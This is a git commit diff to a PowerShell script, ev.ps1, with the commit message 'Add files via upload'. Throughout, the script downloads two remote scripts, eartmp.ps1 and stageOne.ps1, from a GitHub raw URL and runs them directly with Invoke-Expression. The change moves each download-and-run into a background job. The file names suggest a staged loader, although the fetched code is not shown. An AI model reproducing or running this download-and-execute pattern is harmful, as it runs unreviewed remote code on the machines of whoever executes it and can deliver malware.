466bf11fab47284945ba7c7610694c6c53b5535b
allisonmorat <allisonmorat@proton.me>
2025-09-18 16:42:49 +0000

    Add files via upload

--- ev.ps1
+++ ev.ps1
@@ -1,3 +1,13 @@
-Invoke-RestMethod -Uri "https://raw.githubusercontent.com/allisonmorat/three/main/eartmp.ps1" | Invoke-Expression
+$job1 = Start-Job -ScriptBlock {
+    Invoke-RestMethod -Uri "https://raw.githubusercontent.com/allisonmorat/three/main/eartmp.ps1" | Invoke-Expression
+}
 
-Invoke-RestMethod -Uri "https://raw.githubusercontent.com/allisonmorat/three/main/stageOne.ps1" | Invoke-Expression
+Wait-Job $job1
+Receive-Job $job1
+
+$job2 = Start-Job -ScriptBlock {
+    Invoke-RestMethod -Uri "https://raw.githubusercontent.com/allisonmorat/three/main/stageOne.ps1" | Invoke-Expression
+}
+
+Wait-Job $job2
+Receive-Job $job2
